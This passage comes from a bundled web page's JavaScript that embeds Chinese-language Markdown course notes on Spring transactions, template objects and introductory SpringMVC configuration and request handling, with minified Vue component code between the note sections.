**2.10)事务传播行为**\n\n![1591367375088](./img/java/springmvc/Spring-day04/1591367375088.png)\n\n### **2.11)事务传播应用**\n\n- 场景A：生成订单业务\n\n  - 子业务S1：记录日志到数据库表X\n\n  - 子业务S2：保存订单数据到数据库表Y\n\n  - 子业务S3：……\n\n  - 如果S2或S3或……事务提交失败，此时S1是否回滚？如何控制？\n\n  - （S1需要新事务）\n\n- 场景B：生成订单业务\n\n  - 背景1：订单号生成依赖数据库中一个专门用于控制订单号编号生成的表M获取\n\n  - 背景2：每次获取完订单号，表M中记录的编号自增1\n\n  - 子业务S1：从表M中获取订单编号\n\n  - 子业务S2：保存订单数据，订单编号来自于表M\n\n  - 子业务S3：……\n\n  - 如果S2或S3或……事务提交失败，此时S1是否回滚？如何控制？\n\n  - （S1需要新事务）\n\n### **2.12)声明式事务（注解）**\n\n#### 2.12.1)@Transactional\n\n- 名称：@Transactional\n\n- 类型：**方法注解，类注解，接口注解**\n\n- 位置：方法定义上方，类定义上方，接口定义上方\n\n- 作用：设置当前类/接口中所有方法或具体方法开启事务，并指定相关事务属性\n\n- 范例：\n\n  ```java\n  @Transactional(\n      readOnly = false,\n      timeout = -1,\n      isolation = Isolation.DEFAULT,\n      rollbackFor = {ArithmeticException.class, IOException.class},\n      noRollbackFor = {},\n      propagation = Propagation.REQUIRES_NEW\n  )\n  ```\n\n#### 2.12.2)tx:annotation-driven\n\n- 名称：tx:annotation-driven\n\n- 类型：**标签**\n\n- 归属：beans标签\n\n- 作用：开启事务注解驱动，并指定对应的事务管理器\n\n- 范例：\n\n  ```xml\n  <tx:annotation-driven transaction-manager="txManager"/>\n  ```\n\n### **2.13)声明式事务（纯注解驱动）**\n\n- 名称：@EnableTransactionManagement\n\n- 类型：**类注解**\n\n- 位置：Spring注解配置类上方\n\n- 作用：开启注解驱动，等同XML格式中的注解驱动\n\n- 范例：\n\n  ```java\n  @Configuration\n  @ComponentScan("com.itheima")\n  @PropertySource("classpath:jdbc.properties")\n  @Import({JDBCConfig.class,MyBatisConfig.class,TransactionManagerConfig.class})\n  @EnableTransactionManagement\n  public class SpringConfig {\n  }\n  ```\n\n  ```java\n  public class TransactionManagerConfig {\n      @Bean\n      public PlatformTransactionManager getTransactionManager(@Autowired DataSource dataSource){\n          return new DataSourceTransactionManager(dataSource);\n      }\n  }\n  ```\n\n## 3)模板对象\n\n### 3.1)Spring模块对象\n\n![1591368087398](./img/java/springmvc/Spring-day04/1591368087398.png)\n\n- TransactionTemplate\n\n- JdbcTemplate\n\n- RedisTemplate\n\n- RabbitTemplate\n\n- JmsTemplate\n\n- HibernateTemplate\n\n- RestTemplate\n\n### 3.2)JdbcTemplate（了解）\n\n提供标准的sql语句操作API\n\n```java\npublic void save(Account account) {\n    String sql = "insert into account(name,money)values(?,?)";\n    jdbcTemplate.update(sql,account.getName(),account.getMoney());\n}\n```\n\n### 3.3)NamedParameterJdbcTemplate(了解）\n\n提供标准的具名sql语句操作API\n\n```java\npublic void save(Account account) {\n    String sql = "insert into account(name,money)values(:name,:money)";\n    Map pm = new HashMap();\n    pm.put("name",account.getName());\n    pm.put("money",account.getMoney());\n    jdbcTemplate.update(sql,pm);\n}\n```\n\n### **3.4)RedisTemplate**\n\nRedisTemplate对象结构\n\n![1591368270508](./img/java/springmvc/Spring-day04/1591368270508.png)\n\n```java\npublic void changeMoney(Integer id, Double money) {\n    redisTemplate.opsForValue().set("account:id:"+id,money);\n}\npublic Double findMondyById(Integer id) {\n    Object money = redisTemplate.opsForValue().get("account:id:" + id);\n    return new Double(money.toString());\n}\n```\n\n\n\n## 4)事务底层原理解析\n\n### **4.1)策略模式应用**\n\n策略模式（Strategy Pattern）使用不同策略的对象实现不同的行为方式，策略对象的变化导致行为的变化。\n\n![1591368340720](./img/java/springmvc/Spring-day04/1591368340720.png)\n\n策略模式（Strategy Pattern）使用不同策略的对象实现不同的行为方式，策略对象的变化导致行为的变化。\n\n![1591368370924](./img/java/springmvc/Spring-day04/1591368370924.png)\n\n',Je={data:function(){return{MainComponent:Ue}}},ze=Je,We=Object(u["a"])(ze,Be,Fe,!1,null,"1f4e82c9",null),$e=We.exports,Ge=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",{},[t("q-markdown",{attrs:{src:n.MainComponent}})],1)},Ve=[],Qe='# 1 SpringMVC 概述\r\n\r\n**三层架构**    \r\n\r\n- 表现层：负责数据展示\r\n\r\n-  业务层：负责业务处理\r\n\r\n- 数据层：负责数据操作\r\n\r\n![image-20200426174726083](./img/java/springmvc/SpringMVC-day01/image-20200426174726083.png)\r\n\r\nMVC（Model View Controller），一种用于设计创建Web应用程序表现层的模式\r\n\r\n- Model（模型）：数据模型，用于封装数据\r\n\r\n-  View（视图）：页面视图，用于展示数据\r\n\r\n* jsp  \r\n* html\r\n\r\nController（控制器）：处理用户交互的调度器，用于根据用户需求处理程序逻辑\r\n\r\n* Servlet\r\n* SpringMVC\r\n\r\n![image-20200426180210590](./img/java/springmvc/SpringMVC-day01/image-20200426180210590.png)  \r\n\r\n![image-20200426180348299](./img/java/springmvc/SpringMVC-day01/image-20200426180348299.png)\r\n\r\n\r\n# 2 入门案例\r\n\r\n## 2.1 入门案例制作\r\n\r\n①导入SpringMVC相关坐标\r\n\r\n```xml\r\n\x3c!-- servlet3.1规范的坐标 --\x3e\r\n<dependency>\r\n    <groupId>javax.servlet</groupId>\r\n    <artifactId>javax.servlet-api</artifactId>\r\n    <version>3.1.0</version>\r\n    <scope>provided</scope>\r\n</dependency>\r\n\x3c!--jsp坐标--\x3e\r\n<dependency>\r\n    <groupId>javax.servlet.jsp</groupId>\r\n    <artifactId>jsp-api</artifactId>\r\n    <version>2.1</version>\r\n    <scope>provided</scope>\r\n</dependency>\r\n\x3c!--spring的坐标--\x3e\r\n<dependency>\r\n    <groupId>org.springframework</groupId>\r\n    <artifactId>spring-context</artifactId>\r\n    <version>5.1.9.RELEASE</version>\r\n</dependency>\r\n\x3c!--spring web的坐标--\x3e\r\n<dependency>\r\n    <groupId>org.springframework</groupId>\r\n    <artifactId>spring-web</artifactId>\r\n    <version>5.1.9.RELEASE</version>\r\n</dependency>\r\n\x3c!--springmvc的坐标--\x3e\r\n<dependency>\r\n    <groupId>org.springframework</groupId>\r\n    <artifactId>spring-webmvc</artifactId>\r\n    <version>5.1.9.RELEASE</version>\r\n</dependency>\r\n```\r\n\r\n②定义表现层业务处理器Controller，并配置成spring的bean（等同于Servlet）\r\n\r\n```java\r\n@Controller\r\npublic class UserController {\r\n\r\n    public void save(){\r\n        System.out.println("user mvc controller is running ...");\r\n    }\r\n}\r\n```\r\n\r\n```xml\r\n<?xml version="1.0" encoding="UTF-8"?>\r\n<beans xmlns="http://www.springframework.org/schema/beans"\r\n       xmlns:context="http://www.springframework.org/schema/context"\r\n       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\r\n       xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\r\n        http://www.springframework.org/schema/context\r\n        http://www.springframework.org/schema/context/spring-context.xsd">\r\n    \x3c!--扫描加载所有的控制类类--\x3e\r\n    <context:component-scan base-package="com.itheima"/>\r\n\r\n</beans>\r\n```\r\n\r\n③web.xml中配置SpringMVC核心控制器，用于将请求转发到对应的具体业务处理器Controller中（等同于Servlet配置）\r\n\r\n```xml\r\n<servlet>\r\n    <servlet-name>DispatcherServlet</servlet-name>\r\n    <servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>\r\n    <init-param>\r\n        <param-name>contextConfigLocation</param-name>\r\n        <param-value>classpath*:spring-mvc.xml</param-value>\r\n    </init-param>\r\n</servlet>\r\n<servlet-mapping>\r\n    <servlet-name>DispatcherServlet</servlet-name>\r\n    <url-pattern>/</url-pattern>\r\n</servlet-mapping>\r\n```\r\n\r\n④设定具体Controller的访问路径（等同于Servlet在web.xml中的配置）\r\n\r\n```java\r\n//设定当前方法的访问映射地址\r\n@RequestMapping("/save")\r\npublic void save(){\r\n    System.out.println("user mvc controller is running ...");\r\n}\r\n```\r\n\r\n⑤设置返回页面  \r\n\r\n```java\r\n//设定当前方法的访问映射地址\r\n@RequestMapping("/save")\r\n//设置当前方法返回值类型为String，用于指定请求完成后跳转的页面\r\npublic String save(){\r\n    System.out.println("user mvc controller is running ...");\r\n    //设定具体跳转的页面\r\n    return "success.jsp";\r\n}\r\n```\r\n\r\n\r\n\r\n## 2.2 入门案例工作流程分析  \r\n\r\n* 服务器启动\r\n  1. 加载web.xml中DispatcherServlet\r\n  2. 读取spring-mvc.xml中的配置，加载所有com.itheima包中所有标记为bean的类\r\n  3. 读取bean中方法上方标注@RequestMapping的内容\r\n* 处理请求\r\n  1. DispatcherServlet配置拦截所有请求 /\r\n  2. 使用请求路径与所有加载的@RequestMapping的内容进行比对\r\n  3. 执行对应的方法\r\n  4. 根据方法的返回值在webapp目录中查找对应的页面并展示  \r\n\r\n\r\n\r\n## 2.3 SpringMVC 技术架构图\r\n\r\n![image-20200426182959446](./img/java/springmvc/SpringMVC-day01/image-20200426182959446.png)\r\n\r\n\r\n\r\n![image-20200426183024690](./img/java/springmvc/SpringMVC-day01/image-20200426183024690.png)\r\n\r\n\r\n\r\n*  DispatcherServlet：前端控制器， 是整体流程控制的中心，由其调用其它组件处理用户的请求， 有\r\n  效的降低了组件间的耦合性\r\n* HandlerMapping：处理器映射器， 负责根据用户请求找到对应具体的Handler处理器\r\n* Handler：处理器，业务处理的核心类，通常由开发者编写，描述具体的业务\r\n* HandlAdapter：处理器适配器，通过它对处理器进行执行\r\n* View Resolver：视图解析器， 将处理结果生成View视图\r\n* View：视图，最终产出结果， 常用视图如jsp、 html  \r\n\r\n![image-20200426183313406](./img/java/springmvc/SpringMVC-day01/image-20200426183313406.png)\r\n\r\n# 3 基本配置\r\n\r\n## 3.1 常规配置（Controller加载控制）\r\n\r\n* SpringMVC的处理器对应的bean必须按照规范格式开发，未避免加入无效的bean可通过bean加载过滤器进\r\n  行包含设定或排除设定，表现层bean标注通常设定为@Controller  \r\n\r\n**xml方式**\r\n\r\n```xml\r\n<context:component-scan base-package="com.itheima">\r\n    <context:include-filter\r\n                            type="annotation"\r\n                            expression="org.springframework.stereotype.Controller"/>\r\n</context:component-scan>\r\n```\r\n\r\n### 3.1.1 静态资源加载\r\n\r\n```xml\r\n\x3c!--放行指定类型静态资源配置方式--\x3e\r\n<mvc:resources mapping="/img/**" location="/img/"/>\r\n<mvc:resources mapping="/js/**" location="/js/"/>\r\n<mvc:resources mapping="/css/**" location="/css/"/>\r\n\r\n\x3c!--SpringMVC提供的通用资源放行方式--\x3e\r\n<mvc:default-servlet-handler/>\r\n```\r\n\r\n \r\n\r\n### 3.1.2 中文乱码处理 \r\n\r\n  SpringMVC提供专用的中文字符过滤器，用于处理乱码问题  \r\n\r\n  配置在 **web.xml** 里面\r\n\r\n```XML\r\n\x3c!--乱码处理过滤器，与Servlet中使用的完全相同，差异之处在于处理器的类由Spring提供--\x3e\r\n<filter>\r\n    <filter-name>CharacterEncodingFilter</filter-name>\r\n    <filter-class>org.springframework.web.filter.CharacterEncodingFilter</filter-class>\r\n    <init-param>\r\n        <param-name>encoding</param-name>\r\n        <param-value>UTF-8</param-value>\r\n    </init-param>\r\n</filter>\r\n<filter-mapping>\r\n    <filter-name>CharacterEncodingFilter</filter-name>\r\n    <url-pattern>/*</url-pattern>\r\n</filter-mapping>\r\n```\r\n\r\n\r\n\r\n## 3.2 注解驱动\r\n\r\n*   使用注解形式转化SpringMVC核心配置文件为配置类  \r\n\r\n\r\n```java\r\n@Configuration\r\n@ComponentScan(value = "com.itheima",includeFilters =\r\n    @ComponentScan.Filter(type=FilterType.ANNOTATION,classes = {Controller.class})\r\n    )\r\npublic class SpringMVCConfiguration implements WebMvcConfigurer{\r\n    //注解配置放行指定资源格式\r\n//    @Override\r\n//    public void addResourceHandlers(ResourceHandlerRegistry registry) {\r\n//        registry.addResourceHandler("/img/**").addResourceLocations("/img/");\r\n//        registry.addResourceHandler("/js/**").addResourceLocations("/js/");\r\n//        registry.addResourceHandler("/css/**").addResourceLocations("/css/");\r\n//    }\r\n\r\n    //注解配置通用放行资源的格式\r\n    @Override\r\n    public void configureDefaultServletHandling(DefaultServletHandlerConfigurer configurer) {\r\n        configurer.enable();;\r\n    }\r\n}\r\n```\r\n\r\n*   基于servlet3.0规范，自定义Servlet容器初始化配置类，加载SpringMVC核心配置类  \r\n\r\n\r\n```java\r\npublic class ServletContainersInitConfig extends AbstractDispatcherServletInitializer {\r\n    //创建Servlet容器时，使用注解的方式加载SPRINGMVC配置类中的信息，并加载成WEB专用的\t\t\t           //ApplicationContext对象\r\n    //该对象放入了ServletContext范围，后期在整个WEB容器中可以随时获取调用\r\n    @Override\r\n    protected WebApplicationContext createServletApplicationContext() {\r\n        AnnotationConfigWebApplicationContext ctx = new AnnotationConfigWebApplicationContext();\r\n        ctx.register(SpringMVCConfiguration.class);\r\n        return ctx;\r\n    }\r\n\r\n    //注解配置映射地址方式，服务于SpringMVC的核心控制器DispatcherServlet\r\n    @Override\r\n    protected String[] getServletMappings() {\r\n        return new String[]{"/"};\r\n    }\r\n\r\n    @Override\r\n    protected WebApplicationContext createRootApplicationContext() {\r\n        return null;\r\n    }\r\n\r\n    //乱码处理作为过滤器，在servlet容器启动时进行配置，相关内容参看Servlet零配置相关课程\r\n    @Override\r\n    public void onStartup(ServletContext servletContext) throws ServletException {\r\n        super.onStartup(servletContext);\r\n        CharacterEncodingFilter cef = new CharacterEncodingFilter();\r\n        cef.setEncoding("UTF-8");\r\n        FilterRegistration.Dynamic registration = servletContext.addFilter("characterEncodingFilter", cef);\r\n        registration.addMappingForUrlPatterns(EnumSet.of(DispatcherType.REQUEST,DispatcherType.FORWARD,DispatcherType.INCLUDE),false,"/*");\r\n    }\r\n}\r\n```\r\n\r\n  删除web.xml\r\n  删除spring-mvc.xml  \r\n\r\n **小节**\r\n 基于servlet3.0规范，配置Servlet容器初始化配置类，初始化时加载SpringMVC配置类\r\n 转化SpringMVC核心配置文件\r\n 转化为注解（例如： spring处理器加载过滤）\r\n 转化为bean进行加载\r\n 按照标准接口进行开发并加载（例如：中文乱码处理、静态资源加载过滤）  \r\n\r\n# 4 请求\r\n\r\n## 4.1 普通类型参数传参\r\n\r\n  参数名与处理器方法形参名保持一致  \r\n\r\n  访问URL： http://localhost/requestParam1?name=itheima&age=14  \r\n\r\n```java\r\n@RequestMapping("/requestParam1")\r\npublic String requestParam1(String name ,String age){\r\n    System.out.println("name="+name+",age="+age);\r\n    return "page.jsp";\r\n}\r\n```\r\n\r\n **@RequestParam** 的使用\r\n 类型： 形参注解\r\n 位置：处理器类中的方法形参前方\r\n 作用：绑定请求参数与对应处理方法形参间的关系  \r\n\r\n```java\r\n@RequestMapping("/requestParam2")\r\npublic String requestParam2(@RequestParam(\r\n                            name = "userName",\r\n                            required = true,\r\n                            defaultValue = "itheima") String name){\r\n    \r\n    System.out.println("name="+name);\r\n    return "page.jsp";\r\n}\r\n```\r\n\r\n## 4.2 POJO类型参数传参\r\n\r\n当POJO中使用简单类型属性时， 参数名称与POJO类属性名保持一致  \r\n\r\n访问URL： http://localhost/requestParam3?name=itheima&age=14  \r\n\r\n**Controller**\r\n\r\n```java\r\n@RequestMapping("/requestParam3")\r\npublic String requestParam3(User user){\r\n    System.out.println("name="+user.getName());\r\n    return "page.jsp";\r\n}\r\n```\r\n\r\n**POJO类**\r\n\r\n```java\r\npublic class User {\r\n    private String name;\r\n    private Integer age;\r\n    \r\n    public String getName() {\r\n        return name;\r\n    }\r\n\r\n    public void setName(String name) {\r\n        this.name = name;\r\n    }\r\n\r\n    public Integer getAge() {\r\n        return age;\r\n    }\r\n\r\n    public void setAge(Integer age) {\r\n        this.age = age;\r\n    }\r\n\r\n}\r\n```\r\n\r\n\r\n\r\n**参数冲突**\r\n 当POJO类型属性与其他形参出现同名问题时，将被同时赋值\r\n 建议使用@RequestParam注解进行区分\r\n访问URL： http://localhost/requestParam4?name=itheima&**age**=14  \r\n\r\n```java\r\n@RequestMapping("/requestParam4")\r\npublic String requestParam4(User user,String age){\r\n    System.out.println("user.age="+user.getAge()+",age="+age);\r\n    return "page.jsp";\r\n}\r\n```\r\n\r\n\r\n\r\n**复杂POJO类型参数**\r\n 当POJO中出现对象属性时，参数名称与对象层次结构名称保持一致  \r\n\r\n  访问URL： http://localhost/requestParam5?address.province=beijing  \r\n\r\n```java\r\npublic class User {\r\n    private String name;\r\n    private Integer age;\r\n\r\n    private Address address;\r\n    \r\n    public Address getAddress() {\r\n        return address;\r\n    }\r\n\r\n    public void setAddress(Address address) {\r\n        this.address = address;\r\n    }\r\n\r\n    public String getName() {\r\n        return name;\r\n    }\r\n\r\n    public void setName(String name) {\r\n        this.name = name;\r\n    }\r\n\r\n    public Integer getAge() {\r\n        return age;\r\n    }\r\n\r\n    public void setAge(Integer age) {\r\n        this.age = age;\r\n    }\r\n\r\n}\r\n```\r\n\r\n```java\r\n@RequestMapping("/requestParam5")\r\npublic String requestParam5(User user){\r\n    System.out.println("user.address="+user.getAddress().getProvince());\r\n    return "page.jsp";\r\n}\r\n```\r\n\r\n![image-20200426190932459](./img/java/springmvc/SpringMVC-day01/image-20200426190932459.png)\r\n\r\n**当POJO中出现List，保存对象数据，参数名称与对象层次结构名称保持一致，使用数组格式描述集合中对象的位置**  \r\n\r\n访问URL： http://localhost/requestParam7?addresses[0].province=bj&addresses[1].province=tj  \r\n\r\n```java\r\npublic class User {\r\n    private String name;\r\n    private Integer age;\r\n    private List<Address> addresses;\r\n}\r\n\r\npublic class Address {\r\n    private String province;\r\n    private String city;\r\n    private String address;\r\n}\r\n```\r\n\r\n```java\r\n@RequestMapping("/requestParam7")\r\npublic String requestParam7(User user){\r\n    System.out.println("user.addresses="+user.getAddress());\r\n    return "page.jsp";\r\n}\r\n```\r\n\r\n **当POJO中出现Map，保存对象数据，参数名称与对象层次结构名称保持一致，使用映射格式描述集合中对象的位置**  \r\n\r\n 访问URL： http://localhost/requestParam8?addressMap[’home’].province=bj&addressMap[’job’].province=tj  \r\n\r\n```java\r\npublic class User {\r\n    private String name;\r\n    private Integer age;\r\n    private Map<String,Address> addressMap;\r\n}\r\npublic class Address {\r\n    private String province;\r\n    private String city;\r\n    private String address;\r\n}\r\n```\r\n\r\n```java\r\n@RequestMapping("/requestParam8")\r\npublic String requestParam8(User user){\r\n    System.out.println("user.addressMap="+user.getAddressMap());\r\n    return "page.jsp";\r\n}\r\n```\r\n\r\n## 4.3 数组与集合类型参数传参\r\n\r\n**数组类型参数**\r\n\r\n请求参数名与处理器方法形参名保持一致，且请求参数数量＞ 1个  \r\n\r\n访问URL： http://localhost/requestParam9?nick=Jockme&nick=zahc  \r\n\r\n```java\r\n@RequestMapping("/requestParam9")\r\npublic String requestParam9(String[] nick){\r\n    System.out.println(nick[0]+","+nick[1]);\r\n    return "page.jsp";\r\n}\r\n```\r\n\r\n**集合类型参数**\r\n 保存简单类型数据，请求参数名与处理器方法形参名保持一致，且请求参数数量＞ 1个\r\n访问URL： http://localhost/requestParam10?nick=Jockme&nick=zahc\r\n\r\n```java\r\n@RequestMapping("/requestParam10")\r\npublic String requestParam10(@RequestParam("nick") List<String> nick){\r\n    System.out.println(nick);\r\n    return "page.jsp";\r\n}\r\n```\r\n\r\n 注意： SpringMVC默认将List作为对象处理，赋值前先创建对象，然后将nick作为对象的属性进行处理。由于\r\nList是接口，无法创建对象，报无法找到构造方法异常；修复类型为可创建对象的ArrayList类型后，对象可\r\n以创建，但没有nick属性，因此数据为空。此时需要告知SpringMVC的处理器nick是一组数据，而不是一个单\r\n一数据。通过@RequestParam注解，将数量大于1个names参数打包成参数数组后， SpringMVC才能识别该数\r\n据格式，并判定形参类型是否为数组或集合，并按数组或集合对象的形式操作数据。  \r\n\r\n **小节**\r\n 请求POJO类型参数获取\r\n POJO的简单属性\r\n POJO的对象属性\r\n POJO的集合属性（存储简单数据）\r\n POJO的集合属性（存储对象数据）\r\n 名称冲突问题  \r\n\r\n## 4.4 类型转换器\r\n\r\nSpringMVC对接收的数据进行自动类型转换，该工作通过Converter接口实现  \r\n\r\n![image-20200426193801059](./img/java/springmvc/SpringMVC-day01/image-20200426193801059.png)\r\n\r\n* **标量转换器**\r\n   StringToBooleanConverter String→Boolean\r\n   ObjectToStringConverter Object→String\r\n   StringToNumberConverterFactory String→Number（ Integer、 Long等）\r\n   NumberToNumberConverterFactory Number子类型之间(Integer、 Long、 Double等)\r\n   StringToCharacterConverter String→java.lang.Character\r\n   NumberToCharacterConverter Number子类型(Integer、 Long、 Double等)→java.lang.Character\r\n   CharacterToNumberFactory java.lang.Character→Number子类型(Integer、 Long、 Double等)\r\n   StringToEnumConverterFactory String→enum类型\r\n   EnumToStringConverter enum类型→String\r\n   StringToLocaleConverter String→java.util.Local\r\n   PropertiesToStringConverter java.util.Properties→String\r\n   StringToPropertiesConverter String→java.util.Properties  \r\n\r\n* **集合、数组相关转换器**\r\n   ArrayToCollectionConverter 数组→集合（ List、 Set）\r\n   CollectionToArrayConverter 集合（ List、 Set） →数组\r\n   ArrayToArrayConverter 数组间\r\n   CollectionToCollectionConverter 集合间（ List、 Set）\r\n   MapToMapConverter Map间\r\n   ArrayToStringConverter 数组→String类型\r\n   StringToArrayConverter String→数组， trim后使用“,”split\r\n   ArrayToObjectConverter 数组→Object\r\n   ObjectToArrayConverter Object→单元素数组\r\n   CollectionToStringConverter 集合（ List、 Set） →String\r\n   StringToCollectionConverter String→集合（ List、 Set）， trim后使用“,”split\r\n   CollectionToObjectConverter 集合→Object\r\n   ObjectToCollectionConverter Object→单元素集合  \r\n*  **默认转换器**\r\n   ObjectToObjectConverter Object间\r\n   IdToEntityConverter Id→Entity\r\n   FallbackObjectToStringConverter Object→String  \r\n\r\n* **SpringMVC对接收的数据进行自动类型转换，该工作通过Converter接口实现**  \r\n\r\n  ![image-20200426194106166](./img/java/springmvc/SpringMVC-day01/image-20200426194106166.png)\r\n\r\n## 4.5 日期类型格式转换  \r\n\r\n* **声明自定义的转换格式并覆盖系统转换格式**  \r\n\r\n  ```xml\r\n  \x3c!--5.启用自定义Converter--\x3e\r\n  <mvc:annotation-driven conversion-service="conversionService"/>\r\n  \x3c!--1.设定格式类型Converter，注册为Bean，受SpringMVC管理--\x3e\r\n  <bean id="conversionService"\r\n        class="org.springframework.format.support.FormattingConversionServiceFactoryBean">\r\n      \x3c!--2.自定义Converter格式类型设定，该设定使用的是同类型覆盖的思想--\x3e\r\n      <property name="formatters">\r\n          \x3c!--3.使用set保障相同类型的转换器仅保留一个，避免冲突--\x3e\r\n          <set>\r\n              \x3c!--4.设置具体的格式类型--\x3e\r\n              <bean class="org.springframework.format.datetime.DateFormatter">\r\n                  \x3c!--5.类型规则--\x3e\r\n                  <property name="pattern" value="yyyy-MM-dd"/>\r\n              </bean>\r\n          </set>\r\n      </property>\r\n  </bean>\r\n  ```\r\n\r\n* **日期类型格式转换（简化版）**\r\n   名称： @DateTimeFormat\r\n   类型： 形参注解、成员变量注解\r\n   位置：形参前面 或 成员变量上方\r\n   作用：为当前参数或变量指定类型转换规则\r\n   范例：  \r\n\r\n  ```java\r\n  public String requestParam12(@DateTimeFormat(pattern = "yyyy-MM-dd") Date date){\r\n      System.out.println("date="+date);\r\n      return "page.jsp";\r\n  }\r\n  ```\r\n\r\n  ```java\r\n  @DateTimeFormat(pattern = "yyyy-MM-dd")\r\n  private Date birthday;\r\n  ```\r\n\r\n* 注意：依赖注解驱动支持  \r\n\r\n    <mvc:annotation-driven />  \r\n\r\n\r\n## 4.6 自定义类型转换器\r\n\r\n* 自定义类型转换器，实现Converter接口，并制定转换前与转换后的类型\r\n\r\n  ```xml\r\n  \x3c!--1.将自定义Converter注册为Bean，受SpringMVC管理--\x3e\r\n  <bean id="myDateConverter" class="com.itheima.converter.MyDateConverter"/>\r\n  \x3c!--2.设定自定义Converter服务bean--\x3e\r\n  <bean id="conversionService"\r\n        class="org.springframework.context.support.ConversionServiceFactoryBean">\r\n      \x3c!--3.注入所有的自定义Converter，该设定使用的是同类型覆盖的思想--\x3e\r\n      <property name="converters">\r\n          \x3c!--4.set保障同类型转换器仅保留一个，去重规则以Converter<S,T>的泛型为准--\x3e\r\n          <set>\r\n              \x3c!--5.具体的类型转换器--\x3e\r\n              <ref bean="myDateConverter"/>\r\n          </set>\r\n      </property>\r\n  </bean>\r\n  ```\r\n\r\n  ```java\r\n  //自定义类型转换器，实现Converter接口，接口中指定的泛型即为最终作用的条件\r\n  //本例中的泛型填写的是String，Date，最终出现字符串转日期时，该类型转换器生效\r\n  public class MyDateConverter implements Converter<String, Date> {\r\n      //重写接口的抽象方法，参数由泛型决定\r\n      public Date convert(String source) {\r\n          DateFormat df = new SimpleDateFormat("yyyy-MM-dd");\r\n          Date date = null;\r\n          //类型转换器无法预计使用过程中出现的异常，因此必须在类型转换器内部捕获，不允许抛出，框架无法预计此类异常如何处理\r\n          try {\r\n              date = df.parse(source);\r\n          } catch (ParseException e) {\r\n              e.printStackTrace();\r\n          }\r\n          return date;\r\n      }\r\n  }\r\n  ```\r\n\r\n  \r\n\r\n* **通过注册自定义转换器，将该功能加入到SpringMVC的转换服务ConverterService中**  \r\n\r\n  ```xml\r\n  \x3c!--开启注解驱动，加载自定义格式化转换器对应的类型转换服务--\x3e\r\n  <mvc:annotation-driven conversion-service="conversionService"/>\r\n  ```\r\n\r\n  \r\n\r\n## 4.7 请求映射 @RequestMapping\r\n\r\n### 4.7.1 方法注解\r\n\r\n* 名称： @RequestMapping\r\n   类型： 方法注解 \r\n   位置：处理器类中的方法定义上方\r\n   作用：绑定请求地址与对应处理方法间的关系\r\n   范例：\r\n   访问路径： /requestURL1  \r\n\r\n```java\r\n@Controller\r\n@RequestMapping("/user")\r\npublic class UserController {\r\n    @RequestMapping("/requestURL2")\r\n    public String requestURL2() {\r\n        return "page.jsp";\r\n    }\r\n}\r\n```\r\n\r\n### 4.7.2 类注解\r\n\r\n**名称： @RequestMapping**\r\n 类型： 类注解\r\n 位置：处理器类定义上方\r\n 作用：为当前处理器中所有方法设定公共的访问路径前缀\r\n 范例：\r\n 访问路径： /user/requestURL1\r\n\r\n```java\r\n@Controller\r\n@RequestMapping("/user")\r\npublic class UserController {\r\n    @RequestMapping("/requestURL2")\r\n    public String requestURL2() {\r\n        return "page.jsp";\r\n    }\r\n}  \r\n```\r\n\r\n* 常用属性\r\n\r\n  ```java\r\n  @RequestMapping(\r\n      value="/requestURL3", //设定请求路径，与path属性、 value属性相同\r\n      method = RequestMethod.GET, //设定请求方式\r\n      params = "name", //设定请求参数条件\r\n      headers = "content-type=text/*", //设定请求消息头条件\r\n      consumes = "text/*", //用于指定可以接收的请求正文类型（MIME类型）\r\n      produces = "text/*" //用于指定可以生成的响应正文类型（MIME类型）\r\n  )\r\n  public String requestURL3() {\r\n      return "/page.jsp";\r\n  }\r\n  ```\r\n\r\n  \r\n\r\n# 5 响应\r\n\r\n## 5.1 页面跳转\r\n\r\n* 转发（默认）\r\n\r\n```java\r\n@RequestMapping("/showPage1")\r\npublic String showPage1() {\r\n    System.out.println("user mvc controller is running ...");\r\n    return "forward:page.jsp";\r\n}\r\n```\r\n\r\n*  重定向\r\n\r\n```\r\n@RequestMapping("/showPage2")\r\npublic String showPage2() {\r\nSystem.out.println("user mvc controller is running ...");\r\nreturn "redirect:page.jsp";\r\n}\r\n```\r\n\r\n 注意：页面访问地址中所携带的   **/**  \r\n\r\n## 5.2 页面访问快捷设定 (InternalResourceViewResolver)\r\n\r\n  展示页面的保存位置通常固定，且结构相似，可以设定通用的访问路径，简化页面配置格式  \r\n\r\n```java\r\n<bean class="org.springframework.web.servlet.view.InternalResourceViewResolver">\r\n    <property name="prefix" value="/WEB-INF/pages/"/>\r\n    <property name="suffix" value=".jsp"/>\r\n/bean>\r\n```\r\n\r\n```java\r\npublic String showPage3() {\r\n    return "page";\r\n}\r\n```\r\n\r\n  **如果未设定了返回值，使用void类型，则默认使用访问路径作页面地址的前缀后缀**  \r\n\r\n```java\r\n//最简页面配置方式，使用访问路径作为页面名称，省略返回值\r\n@RequestMapping("/showPage5")\r\npublic void showPage5() {\r\n    System.out.println("user mvc controller is running ...");\r\n}\r\n```\r\n\r\n## 5.3 带数据页面跳转\r\n\r\n*   方式一：使用HttpServletRequest类型形参进行数据传递  \r\n\r\n  ```java\r\n  @RequestMapping("/showPageAndData1")\r\n  public String showPageAndData1(HttpServletRequest request) {\r\n      request.setAttribute("name","itheima");\r\n      return "page";\r\n  }\r\n  ```\r\n\r\n  \r\n\r\n*   方式二：使用Model类型形参进行数据传递  \r\n\r\n  ```java\r\n  @RequestMapping("/showPageAndData2")\r\n  public String showPageAndData2(Model model) {\r\n      model.addAttribute("name","itheima");\r\n      Book book = new Book();\r\n      book.setName("SpringMVC入门实战");\r\n      book.setPrice(66.6d);\r\n      model.addAttribute("book",book);\r\n      return "page";\r\n  }\r\n  ```\r\n\r\n  \r\n\r\n*   方式三：使用ModelAndView类型形参进行数据传递，将该对象作为返回值传递给调用者  \r\n\r\n  ```java\r\n  //使用ModelAndView形参传递参数，该对象还封装了页面信息\r\n  @RequestMapping("/showPageAndData3")\r\n  public ModelAndView showPageAndData3(ModelAndView modelAndView) {\r\n      //ModelAndView mav = new ModelAndView();    替换形参中的参数\r\n      Book book  = new Book();\r\n      book.setName("SpringMVC入门案例");\r\n      book.setPrice(66.66d);\r\n      //添加数据的方式，key对value\r\n      modelAndView.addObject("book",book);\r\n      //添加数据的方式，key对value\r\n      modelAndView.addObject("name","Jockme");\r\n      //设置页面的方式，该方法最后一次执行的结果生效\r\n      modelAndView.setViewName("page");\r\n   